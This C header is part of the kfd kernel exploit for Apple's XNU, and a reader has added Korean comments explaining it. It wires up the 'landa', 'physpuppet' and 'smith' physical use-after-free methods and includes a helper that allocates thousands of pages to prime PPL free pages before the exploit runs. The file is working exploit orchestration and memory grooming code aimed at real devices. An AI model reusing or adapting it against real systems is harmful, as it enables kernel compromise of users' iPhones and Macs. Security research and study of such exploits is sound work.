/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef puaf_h
#define puaf_h

// Forward declarations for helper functions.
void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
void puaf_helper_give_ppl_pages(void);

#include "puaf/landa.h"
#include "puaf/physpuppet.h"
#include "puaf/smith.h"

#define puaf_method_case(method)                                 \
    case puaf_##method: {                                        \
        const char* method_name = #method;                       \
        print_string(method_name);                               \
        kfd->puaf.puaf_method_ops.init = method##_init;          \
        kfd->puaf.puaf_method_ops.run = method##_run;            \
        kfd->puaf.puaf_method_ops.cleanup = method##_cleanup;    \
        kfd->puaf.puaf_method_ops.free = method##_free;          \
        break;                                                   \
    }

//MARK: - PUAF main
void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
{
    kfd->puaf.number_of_puaf_pages = puaf_pages;
    kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));

    switch (puaf_method) {
        puaf_method_case(landa)
        puaf_method_case(physpuppet)
        puaf_method_case(smith)
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
    puaf_helper_give_ppl_pages();

    timer_start();
    kfd->puaf.puaf_method_ops.run(kfd);
    timer_end();
}

void puaf_cleanup(struct kfd* kfd)
{
    timer_start();
    kfd->puaf.puaf_method_ops.cleanup(kfd);
    timer_end();
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(u64));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

/*
 * Helper puaf functions.
 */

void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
{
    u64 first_address = 0;
    u64 last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
{
    /// task_vm_info_data_t
    /// device에서 virtual memory information에 접근할 때 사용하는 type
    /// 프로세스가 접근할 수 있는 최소 address
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    /// https://developer.apple.com/documentation/kernel/task_vm_info_data_t
    *min_out = data.min_address;
    *max_out = data.max_address;
}

//MARK: - ppl_pages를 상위 PPL에 give(주는) 과정
/// PPL이 사용할 수 있는 프리페이지가 부족해지면 일반 커널이 자체 프리큐에서 페이지를 가져와서 제공
/// 하지만 물리 프레임 밖에서 일어나면 커널 패닉 발생
/// 따라서 밖에서 프리페이지를 가져오지 않도록 하기 위해 최대한 많은 ppl_pages를 주는 방식
void puaf_helper_give_ppl_pages(void)
{
    timer_start();

    /// given_ppl_pages_max는 크면 클수록 좋음
    const u64 given_ppl_pages_max = 10000;
    
    /// ull == unsigned long long
    /// u64는 os마다 unsigned 8,unsigned 16 ... 의 크기가 다름.
    /// https://m.blog.naver.com/eom913/119569743
    const u64 l2_block_size = (1ull << 25);

    //INFO: vm_address_t - vm_offset_t - uintptr_t
    /// https://developer.apple.com/documentation/kernel/vm_address_t
    /// 가상메모리에서 offset을 가리키는 포인터
    /// 포인터 저장 목적
    /// 정의 또한 typedef으로 되어있음.
    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    u64 given_ppl_pages = 0;

    u64 min_address, max_address;
    /// 접근할 수 있는 최소 address와 최대 address를 리턴받음.
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    
    while (true) {
        // address + 2^25(1ull << 25)
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        /// vm_allocate()를 이용해서 PPL_pages를 원하는 크기만큼 할당
        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            /// 사용자 공간에서 인식가능하도록 하는 과정
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            /// 최대 페이지 수로 설정한 10000에 도달하면 break
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }
    
    
    /// 할당 메모리 해제
    for (u64 i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
    timer_end();
}

#endif /* puaf_h */
